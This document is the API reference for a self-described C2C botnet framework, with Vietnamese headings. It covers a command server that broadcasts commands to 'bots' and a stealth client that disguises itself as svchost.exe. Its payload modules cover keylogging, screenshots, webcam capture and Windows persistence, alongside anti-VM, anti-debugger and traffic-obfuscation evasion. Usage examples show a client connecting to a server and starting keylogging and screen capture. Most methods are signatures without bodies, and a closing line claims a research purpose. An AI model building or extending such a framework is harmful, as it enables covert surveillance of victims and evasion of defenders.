# 📚 API REFERENCE - C2C BOTNET SYSTEM

## 📋 Mục Lục
- [1. Core API Classes](#1-core-api-classes)
- [2. Server API](#2-server-api)
- [3. Client API](#3-client-api)
- [4. Payload Module API](#4-payload-module-api)
- [5. Utility API](#5-utility-api)
- [6. Configuration API](#6-configuration-api)
- [7. Events và Callbacks](#7-events-và-callbacks)
- [8. Error Handling](#8-error-handling)

---

## 1. Core API Classes

### 🖥️ ThreadSafeServer Class

#### Constructor
```python
class ThreadSafeServer:
    def __init__(self, 
                 host: str = 'localhost',
                 port: int = 4444,
                 max_clients: int = 100,
                 ssl_enabled: bool = True,
                 rate_limit: int = 100,
                 worker_threads: int = 32,
                 io_threads: int = 16):
        """
        Initialize thread-safe C2C server.
        
        Args:
            host: Server bind address
            port: Server port number
            max_clients: Maximum concurrent clients
            ssl_enabled: Enable SSL/TLS encryption
            rate_limit: Requests per minute per client
            worker_threads: Worker thread pool size
            io_threads: I/O thread pool size
        """
```

#### Core Methods
```python
def start_server(self) -> None:
    """Start the C2C server with all security features."""

def stop_server(self) -> None:
    """Gracefully shutdown server and cleanup resources."""

def get_statistics(self) -> Dict[str, Any]:
    """
    Get comprehensive server statistics.
    
    Returns:
        Dict containing:
        - active_clients: int
        - total_sessions: int  
        - data_transferred: int (bytes)
        - uptime: float (seconds)
        - success_rate: float (percentage)
        - memory_usage: int (bytes)
        - cpu_usage: float (percentage)
    """

def broadcast_command(self, command: str, clients: List[str] = None) -> Dict[str, Any]:
    """
    Send command to multiple clients.
    
    Args:
        command: Command string to execute
        clients: List of client IDs (None = all clients)
        
    Returns:
        Dict mapping client_id -> response
    """

def get_client_info(self, client_id: str) -> Optional[Dict[str, Any]]:
    """
    Get detailed information about specific client.
    
    Args:
        client_id: Unique client identifier
        
    Returns:
        Dict with client details or None if not found
    """
```

#### Connection Management
```python
@contextmanager
def connection_context(self, client_socket: socket.socket):
    """Context manager for safe connection handling."""

def _handle_client(self, client_socket: socket.socket, client_address: tuple) -> None:
    """Internal method to handle individual client connections."""

def _cleanup_connection(self, client_socket: socket.socket) -> None:
    """Clean up client connection resources."""

def disconnect_client(self, client_id: str) -> bool:
    """
    Disconnect specific client.
    
    Args:
        client_id: Client to disconnect
        
    Returns:
        True if successful, False otherwise
    """
```

### 🤖 ThreadSafeClient Class

#### Constructor
```python
class ThreadSafeClient:
    def __init__(self,
                 server_host: str = 'localhost',
                 server_port: int = 4444,
                 auto_reconnect: bool = True,
                 reconnect_delay: int = 5,
                 max_reconnect_attempts: int = 10,
                 stealth_mode: bool = False):
        """
        Initialize thread-safe client.
        
        Args:
            server_host: C2C server address
            server_port: C2C server port
            auto_reconnect: Enable automatic reconnection
            reconnect_delay: Delay between reconnect attempts
            max_reconnect_attempts: Maximum reconnection tries
            stealth_mode: Enable stealth operation mode
        """
```

#### Core Methods
```python
def connect_to_server(self, host: str = None, port: int = None) -> bool:
    """
    Connect to C2C server.
    
    Args:
        host: Override default server host
        port: Override default server port
        
    Returns:
        True if connection successful
    """

def disconnect(self) -> None:
    """Disconnect from server and cleanup."""

def send_command_result(self, command: str, result: str) -> bool:
    """
    Send command execution result to server.
    
    Args:
        command: Original command
        result: Execution result
        
    Returns:
        True if sent successfully
    """

def execute_command(self, command: str) -> str:
    """
    Execute system command and return result.
    
    Args:
        command: Command to execute
        
    Returns:
        Command output or error message
    """

def get_system_info(self) -> Dict[str, Any]:
    """
    Collect comprehensive system information.
    
    Returns:
        Dict with system details:
        - hostname, os, architecture
        - cpu_info, memory_info
        - network_interfaces
        - running_processes
        - installed_software
    """
```

---

## 2. Server API

### 🔧 Configuration Management

```python
class ServerConfig:
    def __init__(self):
        """Server configuration management."""
        
    def update_config(self, config: Dict[str, Any]) -> None:
        """Update server configuration."""
        
    def get_config(self, key: str = None) -> Any:
        """Get configuration value(s)."""
        
    def validate_config(self) -> List[str]:
        """Validate current configuration, return errors."""
```

### 📊 Statistics và Monitoring

```python
class ServerMonitor:
    def get_real_time_stats(self) -> Dict[str, Any]:
        """Get real-time server statistics."""
        
    def get_client_statistics(self) -> List[Dict[str, Any]]:
        """Get statistics for all connected clients."""
        
    def get_performance_metrics(self) -> Dict[str, float]:
        """Get server performance metrics."""
        
    def get_security_alerts(self) -> List[Dict[str, Any]]:
        """Get recent security alerts."""
        
    def export_statistics(self, format: str = 'json') -> str:
        """Export statistics in specified format."""
```

### 🔐 Security Management

```python
class SecurityManager:
    def generate_ssl_certificates(self, 
                                  key_size: int = 2048,
                                  validity_days: int = 365) -> bool:
        """Generate new SSL certificates."""
        
    def validate_ssl_certificates(self) -> Dict[str, Any]:
        """Validate current SSL certificates."""
        
    def update_cipher_suites(self, ciphers: str) -> None:
        """Update SSL cipher suite configuration."""
        
    def enable_rate_limiting(self, 
                           requests_per_minute: int = 100,
                           block_duration: int = 300) -> None:
        """Configure rate limiting."""
        
    def add_ip_to_whitelist(self, ip_address: str) -> None:
        """Add IP to connection whitelist."""
        
    def block_ip_address(self, ip_address: str, duration: int = 3600) -> None:
        """Block IP address for specified duration."""
```

---

## 3. Client API

### 💻 System Operations

```python
class SystemOperations:
    def get_system_info(self) -> Dict[str, Any]:
        """Collect detailed system information."""
        
    def get_network_info(self) -> Dict[str, Any]:
        """Get network configuration and connections."""
        
    def get_process_list(self) -> List[Dict[str, Any]]:
        """Get list of running processes."""
        
    def kill_process(self, pid: int) -> bool:
        """Terminate process by PID."""
        
    def start_process(self, executable: str, args: List[str] = None) -> int:
        """Start new process, return PID."""
```

### 📁 File Operations

```python
class FileOperations:
    def list_directory(self, path: str) -> List[Dict[str, Any]]:
        """List directory contents with metadata."""
        
    def read_file(self, file_path: str, binary: bool = False) -> bytes:
        """Read file contents."""
        
    def write_file(self, file_path: str, content: bytes) -> bool:
        """Write data to file."""
        
    def delete_file(self, file_path: str) -> bool:
        """Delete file securely."""
        
    def download_file(self, remote_url: str, local_path: str) -> bool:
        """Download file from URL."""
        
    def compress_file(self, file_path: str, output_path: str) -> bool:
        """Compress file using ZIP."""
```

### 🌐 Network Operations

```python
class NetworkOperations:
    def scan_network(self, ip_range: str, ports: List[int] = None) -> List[Dict[str, Any]]:
        """Scan network for active hosts and open ports."""
        
    def check_connectivity(self, host: str, port: int) -> bool:
        """Test network connectivity to host:port."""
        
    def get_external_ip(self) -> str:
        """Get external IP address."""
        
    def get_wifi_networks(self) -> List[Dict[str, Any]]:
        """Scan for available WiFi networks."""
        
    def connect_wifi(self, ssid: str, password: str) -> bool:
        """Connect to WiFi network."""
```

---

## 4. Payload Module API

### 📦 Base Payload Class

```python
class BasePayload:
    def __init__(self, client_instance):
        """Base class for all payload modules."""
        self.client = client_instance
        self.config = {}
        self.running = False
        
    def start(self) -> bool:
        """Start the payload module."""
        raise NotImplementedError
        
    def stop(self) -> bool:
        """Stop the payload module."""
        raise NotImplementedError
        
    def configure(self, config: Dict[str, Any]) -> None:
        """Configure module parameters."""
        self.config.update(config)
        
    def get_status(self) -> Dict[str, Any]:
        """Get module status and statistics."""
        return {
            'running': self.running,
            'config': self.config,
            'last_activity': getattr(self, 'last_activity', None)
        }
```

### ⌨️ Keylogger Module API

```python
class KeyloggerPayload(BasePayload):
    def __init__(self, client_instance):
        super().__init__(client_instance)
        self.buffer_size = 10000
        self.capture_special_keys = True
        
    def start(self) -> bool:
        """Start keystroke capture."""
        
    def stop(self) -> bool:
        """Stop keystroke capture."""
        
    def get_captured_keys(self) -> str:
        """Retrieve captured keystrokes."""
        
    def clear_buffer(self) -> None:
        """Clear keystroke buffer."""
        
    def set_buffer_size(self, size: int) -> None:
        """Set maximum buffer size."""
```

### 📸 Screenshot Module API

```python
class ScreenshotPayload(BasePayload):
    def __init__(self, client_instance):
        super().__init__(client_instance)
        self.quality = 80
        self.interval = 300  # seconds
        
    def take_screenshot(self, 
                       all_monitors: bool = False,
                       quality: int = None) -> bytes:
        """
        Capture screenshot.
        
        Args:
            all_monitors: Capture all monitors
            quality: JPEG quality (1-100)
            
        Returns:
            Screenshot as JPEG bytes
        """
        
    def start_scheduled_capture(self, interval: int = 300) -> bool:
        """Start scheduled screenshot capture."""
        
    def stop_scheduled_capture(self) -> bool:
        """Stop scheduled captures."""
        
    def get_monitor_info(self) -> List[Dict[str, Any]]:
        """Get information about available monitors."""
```

### 📹 Webcam Module API

```python
class WebcamPayload(BasePayload):
    def list_cameras(self) -> List[Dict[str, Any]]:
        """Get list of available cameras."""
        
    def take_photo(self, camera_id: int = 0) -> bytes:
        """Take photo from specified camera."""
        
    def record_video(self, 
                    duration: int = 30,
                    camera_id: int = 0,
                    quality: str = 'medium') -> bytes:
        """Record video for specified duration."""
        
    def start_stream(self, camera_id: int = 0) -> bool:
        """Start video streaming."""
        
    def stop_stream(self) -> bool:
        """Stop video streaming."""
```

### 🔄 Persistence Module API

```python
class PersistencePayload(BasePayload):
    def install_registry_persistence(self, 
                                   executable_path: str,
                                   key_name: str = None) -> bool:
        """Install registry-based persistence."""
        
    def install_task_persistence(self,
                                executable_path: str,
                                task_name: str = None,
                                trigger: str = 'logon') -> bool:
        """Install scheduled task persistence."""
        
    def install_service_persistence(self,
                                  executable_path: str,
                                  service_name: str = None) -> bool:
        """Install Windows service persistence."""
        
    def remove_persistence(self, method: str = 'all') -> bool:
        """Remove specified persistence methods."""
        
    def check_persistence_status(self) -> Dict[str, bool]:
        """Check status of all persistence methods."""
```

---

## 5. Utility API

### 🔐 Crypto Utilities

```python
class CryptoManager:
    def __init__(self, key: bytes = None):
        """Initialize with encryption key."""
        
    def generate_key(self) -> bytes:
        """Generate new encryption key."""
        
    def encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data using AES."""
        
    def decrypt_data(self, encrypted_data: bytes) -> bytes:
        """Decrypt AES encrypted data."""
        
    def hash_data(self, data: bytes, algorithm: str = 'sha256') -> str:
        """Generate hash of data."""
        
    def generate_rsa_keypair(self, key_size: int = 2048) -> Tuple[bytes, bytes]:
        """Generate RSA public/private key pair."""
```

### 🛡️ Anti-VM Detection

```python
class VMDetector:
    def detect_vm_environment(self) -> Dict[str, Any]:
        """
        Detect virtual machine environment.
        
        Returns:
            Dict with detection results:
            - is_vm: bool
            - confidence: float (0-1)
            - indicators: List[str]
            - vm_type: Optional[str]
        """
        
    def check_vm_processes(self) -> List[str]:
        """Check for VM-related processes."""
        
    def check_vm_registry(self) -> List[str]:
        """Check registry for VM indicators."""
        
    def check_vm_files(self) -> List[str]:
        """Check filesystem for VM indicators."""
        
    def check_hardware_signatures(self) -> List[str]:
        """Check hardware signatures for VM."""
```

### 🔍 Memory Protection

```python
class MemoryProtector:
    def protect_process_memory(self, pid: int = None) -> bool:
        """Enable memory protection for process."""
        
    def detect_debugger(self) -> bool:
        """Detect if debugger is attached."""
        
    def anti_dump_protection(self) -> bool:
        """Enable anti-memory dump protection."""
        
    def clear_sensitive_memory(self, memory_regions: List[int]) -> None:
        """Securely clear sensitive memory regions."""
        
    def randomize_memory_layout(self) -> bool:
        """Enable memory layout randomization."""
```

### 🌐 Network Protection

```python
class NetworkProtector:
    def detect_packet_capture(self) -> bool:
        """Detect if network traffic is being captured."""
        
    def enable_traffic_obfuscation(self) -> bool:
        """Enable network traffic obfuscation."""
        
    def check_proxy_settings(self) -> Dict[str, Any]:
        """Check system proxy configuration."""
        
    def detect_network_monitoring(self) -> List[str]:
        """Detect network monitoring tools."""
        
    def randomize_traffic_patterns(self) -> None:
        """Randomize network traffic patterns."""
```

---

## 6. Configuration API

### ⚙️ Server Configuration

```python
class ServerConfiguration:
    # Network settings
    HOST = '0.0.0.0'
    PORT = 4444
    MAX_CLIENTS = 1000
    
    # SSL/TLS settings
    SSL_ENABLED = True
    SSL_CERT_PATH = 'server_cert.pem'
    SSL_KEY_PATH = 'server_key.pem'
    SSL_MINIMUM_VERSION = ssl.TLSVersion.TLSv1_2
    
    # Threading settings
    WORKER_THREADS = 32
    IO_THREADS = 16
    CONNECTION_TIMEOUT = 30
    
    # Security settings
    RATE_LIMIT = 100  # requests per minute
    ENABLE_IP_WHITELIST = False
    AUTO_BLOCK_SUSPICIOUS_IPS = True
    
    # Logging settings
    LOG_LEVEL = logging.INFO
    LOG_FILE = 'server.log'
    ENABLE_AUDIT_LOG = True
    
    def update_from_dict(self, config: Dict[str, Any]) -> None:
        """Update configuration from dictionary."""
        
    def validate(self) -> List[str]:
        """Validate configuration, return error list."""
        
    def save_to_file(self, file_path: str) -> None:
        """Save configuration to file."""
        
    def load_from_file(self, file_path: str) -> None:
        """Load configuration from file."""
```

### 🤖 Client Configuration

```python
class ClientConfiguration:
    # Connection settings
    SERVER_HOST = 'localhost'
    SERVER_PORT = 4444
    AUTO_RECONNECT = True
    RECONNECT_DELAY = 5
    MAX_RECONNECT_ATTEMPTS = 10
    
    # Stealth settings
    STEALTH_MODE = False
    PROCESS_NAME = 'svchost.exe'
    HIDE_WINDOW = True
    ANTI_VM_ENABLED = True
    
    # Operation settings
    COMMAND_TIMEOUT = 60
    HEARTBEAT_INTERVAL = 30
    DATA_COLLECTION_INTERVAL = 300
    
    # Persistence settings
    ENABLE_PERSISTENCE = True
    PERSISTENCE_METHODS = ['registry', 'task_scheduler']
    
    # Security settings
    ENABLE_ENCRYPTION = True
    OBFUSCATE_TRAFFIC = True
    ENABLE_CERTIFICATE_PINNING = True
```

---

## 7. Events và Callbacks

### 📡 Server Events

```python
class ServerEvents:
    def on_client_connected(self, client_info: Dict[str, Any]) -> None:
        """Called when new client connects."""
        
    def on_client_disconnected(self, client_id: str, reason: str) -> None:
        """Called when client disconnects."""
        
    def on_command_executed(self, 
                          client_id: str,
                          command: str,
                          result: str,
                          execution_time: float) -> None:
        """Called when command execution completes."""
        
    def on_security_alert(self, alert_type: str, details: Dict[str, Any]) -> None:
        """Called when security alert is triggered."""
        
    def on_error(self, error_type: str, error_message: str) -> None:
        """Called when error occurs."""

# Usage example
def register_event_handlers(server: ThreadSafeServer):
    server.events.on_client_connected = lambda info: print(f"New client: {info['hostname']}")
    server.events.on_security_alert = lambda type, details: log_security_event(type, details)
```

### 🤖 Client Events

```python
class ClientEvents:
    def on_connected_to_server(self) -> None:
        """Called when successfully connected to server."""
        
    def on_disconnected_from_server(self, reason: str) -> None:
        """Called when disconnected from server."""
        
    def on_command_received(self, command: str) -> None:
        """Called when command is received from server."""
        
    def on_module_started(self, module_name: str) -> None:
        """Called when payload module starts."""
        
    def on_module_stopped(self, module_name: str) -> None:
        """Called when payload module stops."""
```

---

## 8. Error Handling

### ❌ Exception Classes

```python
class C2CException(Exception):
    """Base exception for C2C operations."""
    pass

class ConnectionError(C2CException):
    """Raised when connection fails."""
    pass

class AuthenticationError(C2CException):
    """Raised when authentication fails."""
    pass

class CommandExecutionError(C2CException):
    """Raised when command execution fails."""
    pass

class ModuleError(C2CException):
    """Raised when payload module operation fails."""
    pass

class SecurityError(C2CException):
    """Raised when security violation detected."""
    pass

class ConfigurationError(C2CException):
    """Raised when configuration is invalid."""
    pass
```

### 🔧 Error Handling Examples

```python
# Server error handling
try:
    server = ThreadSafeServer()
    server.start_server()
except ConfigurationError as e:
    logger.error(f"Configuration error: {e}")
    sys.exit(1)
except SecurityError as e:
    logger.critical(f"Security error: {e}")
    server.emergency_shutdown()
except Exception as e:
    logger.exception(f"Unexpected error: {e}")

# Client error handling
try:
    client = ThreadSafeClient()
    if not client.connect_to_server():
        raise ConnectionError("Failed to connect to server")
        
    result = client.execute_command("sysinfo")
except ConnectionError as e:
    logger.error(f"Connection failed: {e}")
    client.attempt_reconnection()
except CommandExecutionError as e:
    logger.warning(f"Command execution failed: {e}")
    client.send_error_report(str(e))
```

### 📝 Logging API

```python
class LogManager:
    def __init__(self, log_level: int = logging.INFO):
        """Initialize logging manager."""
        
    def log_event(self, 
                  level: int,
                  message: str,
                  category: str = 'general',
                  client_id: str = None) -> None:
        """Log event with metadata."""
        
    def log_security_event(self,
                          event_type: str,
                          severity: str,
                          details: Dict[str, Any]) -> None:
        """Log security-related event."""
        
    def log_command_execution(self,
                            client_id: str,
                            command: str,
                            result: str,
                            execution_time: float) -> None:
        """Log command execution."""
        
    def export_logs(self,
                   start_time: datetime = None,
                   end_time: datetime = None,
                   format: str = 'json') -> str:
        """Export logs in specified format."""
```

---

## 📖 Usage Examples

### 🚀 Basic Server Setup

```python
from core.server import ThreadSafeServer
from utils.logger import LogManager
import logging

# Initialize logging
log_manager = LogManager(logging.INFO)

# Create and configure server
server = ThreadSafeServer(
    host='0.0.0.0',
    port=4444,
    max_clients=500,
    ssl_enabled=True
)

# Register event handlers
server.events.on_client_connected = lambda info: print(f"New bot: {info['hostname']}")
server.events.on_security_alert = lambda type, details: log_manager.log_security_event(type, 'HIGH', details)

# Start server
try:
    server.start_server()
    print("✅ C2C Server started successfully")
except Exception as e:
    print(f"❌ Failed to start server: {e}")
```

### 🤖 Basic Client Setup

```python
from client import ThreadSafeClient
from payload.modules.keylogger import KeyloggerPayload
from payload.modules.screenshot import ScreenshotPayload

# Create client instance
client = ThreadSafeClient(
    server_host='192.168.1.100',
    server_port=4444,
    stealth_mode=True
)

# Load payload modules
keylogger = KeyloggerPayload(client)
screenshot = ScreenshotPayload(client)

# Connect to server
if client.connect_to_server():
    print("✅ Connected to C2C server")
    
    # Start payload modules
    keylogger.start()
    screenshot.start_scheduled_capture(interval=300)
    
    # Main client loop
    client.run()
else:
    print("❌ Failed to connect to server")
```

### 🔧 Custom Payload Module

```python
from payload.modules.base import BasePayload
import time
import threading

class CustomDataCollector(BasePayload):
    def __init__(self, client_instance):
        super().__init__(client_instance)
        self.collection_interval = 60
        self.collection_thread = None
        
    def start(self) -> bool:
        """Start data collection."""
        if self.running:
            return False
            
        self.running = True
        self.collection_thread = threading.Thread(target=self._collection_loop, daemon=True)
        self.collection_thread.start()
        return True
        
    def stop(self) -> bool:
        """Stop data collection."""
        self.running = False
        if self.collection_thread:
            self.collection_thread.join(timeout=5)
        return True
        
    def _collection_loop(self):
        """Main collection loop."""
        while self.running:
            try:
                data = self._collect_custom_data()
                self.client.send_data('custom_data', data)
                time.sleep(self.collection_interval)
            except Exception as e:
                self.client.log_error(f"Collection error: {e}")
                
    def _collect_custom_data(self) -> dict:
        """Collect custom data - implement your logic here."""
        return {
            'timestamp': time.time(),
            'custom_field': 'custom_value'
        }

# Usage
custom_collector = CustomDataCollector(client)
custom_collector.configure({'collection_interval': 30})
custom_collector.start()
```

---

**© 2025 C2C Botnet Project - API Reference Documentation**

*Tài liệu này cung cấp API reference hoàn chỉnh cho việc phát triển và mở rộng hệ thống C2C Botnet. Vui lòng sử dụng responsibly và chỉ cho mục đích nghiên cứu hợp pháp.*
